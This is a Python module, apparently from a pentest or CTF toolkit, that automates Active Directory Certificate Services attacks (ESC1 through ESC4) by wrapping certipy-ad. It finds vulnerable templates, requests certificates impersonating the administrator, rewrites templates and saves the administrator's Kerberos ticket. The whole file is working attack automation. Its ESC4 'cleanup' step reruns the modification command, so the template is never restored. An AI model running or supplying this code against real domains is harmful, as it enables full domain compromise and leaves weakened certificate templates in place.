import os
import config

def find_vuln_temp(box,path):
    config.required_creds(box)
    os.chdir(path.ws_adcs)
    print('\033[93m[*]\033[0m Find vuln CertTemp')
    if box.krb:
        cmd = f"{box.krb} certipy-ad find -u {box.username} -k -no-pass -target {box.fqdn} -vulnerable -stdout"
    elif box.nt_hash:
        cmd = f"certipy-ad find -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -vulnerable -stdout"
    else:
        cmd = f"certipy-ad find -u {box.username} -p '{box.password}' -target {box.fqdn} -vulnerable -stdout"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd+f' 2>&1 | tee {box.username}-vulntemp.out')
    print('\033[92m[+]\033[0m Find vuln CertTemp\n')

def esc1(box, path):
    config.required_creds(box)
    config.required_target(box)
    config.required_ca(box)
    os.chdir(path.ws_adcs)
    print('\033[93m[*]\033[0m ESC1')
    if box.krb:
        cmd1 = f"{box.krb} certipy-ad req -k -no-pass -target {box.fqdn} -ca {box.ca} -template {box.target} -upn administrator"
    elif box.nt_hash:
        cmd1 = f"certipy-ad req -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -ca {box.ca} -template {box.target} -upn administrator"
    else:
        cmd1 = f"certipy-ad req -u {box.username} -p '{box.password}' -target {box.fqdn} -ca {box.ca} -template {box.target} -upn administrator"
    cmd2 = f"certipy-ad auth -pfx administrator.pfx -username administrator -domain {box.domain}"
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1+f' 2>&1 | tee {box.target}-req_esc1.out')
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
    os.system(cmd2+f' 2>&1 | tee {box.target}-auth_esc1.out')
    os.system(f'cp administrator.ccache {path.ws_ccache}')
    print('\033[92m[+]\033[0m ESC1\n')

def esc2_and_3(box, path, nr):
    config.required_creds(box)
    config.required_target(box)
    config.required_ca(box)
    os.chdir(path.ws_adcs)
    print(f'\033[93m[*]\033[0m ESC{nr}')
    if box.krb:
        cmd1 = f"{box.krb} certipy-ad req -k -no-pass -target {box.fqdn} -ca {box.ca} -template {box.target}"
        cmd2 = f"{box.krb} certipy-ad req -k -no-pass -target {box.fqdn} -ca {box.ca} -template User -on-behalf-of administrator -pfx {box.username}.pfx"
    elif box.nt_hash:
        cmd1 = f"certipy-ad req -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -ca {box.ca} -template {box.target}"
        cmd2 = f"certipy-ad req -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -ca {box.ca} -template User -on-behalf-of administrator -pfx {box.username}.pfx"
    else:
        cmd1 = f"certipy-ad req -u {box.username} -p '{box.password}' -target {box.fqdn} -ca {box.ca} -template {box.target}"
        cmd2 = f"certipy-ad req -u {box.username} -p '{box.password}' -target {box.fqdn} -ca {box.ca} -template User -on-behalf-of administrator -pfx {box.username}.pfx"
    cmd3 = f"certipy-ad auth -pfx administrator.pfx -username administrator -domain {box.domain}"
    config.log_cmd([cmd1,cmd2,cmd3])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1+f' 2>&1 | tee {box.target}-req-1_esc{nr}.out')
    print(f'\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2+f' 2>&1 | tee {box.target}-req-2_esc{nr}.out')
    print(f'\n\033[96m[$]\033[0m {cmd3}')
    os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
    os.system(cmd3+f' 2>&1 | tee {box.target}-auth_esc{nr}.out')
    os.system(f'cp administrator.ccache {path.ws_ccache}')
    print(f'\033[92m[+]\033[0m ESC{nr}\n')

def esc4(box,path):
    config.required_creds(box)
    config.required_target(box)
    config.required_ca(box)
    os.chdir(path.ws_adcs)
    print('\033[93m[*]\033[0m ESC4')
    if box.krb:
        cmd1 = f"{box.krb} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target} -save-old"
        cmd2 = f"{box.krb} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target}"
        cmd3 = f"{box.krb} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
    elif box.nt_hash:
        cmd1 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target} -save-old"
        cmd2 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target}"
        cmd3 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
    else:
        cmd1 = f"certipy-ad template -u {box.username} -p '{box.password}' -target {box.fqdn} -template {box.target} -save-old"
        cmd2 = f"certipy-ad template -u {box.username} -p '{box.password}' -target {box.fqdn} -template {box.target}"
        cmd3 = f"certipy-ad template -u {box.username} -p '{box.password}' -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1+f' 2>&1 | tee {box.target}-template_save-old_esc4.out')
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2+f' 2>&1 | tee {box.target}-template_esc4.out')
    esc1(box, path)
    print(f'\n\033[96m[$]\033[0m {cmd3}')
    os.system(cmd2+f' 2>&1 | tee {box.target}-template_cleanup_esc4.out')
    config.log_cmd(cmd3)
    print('\033[92m[+]\033[0m ESC4\n')
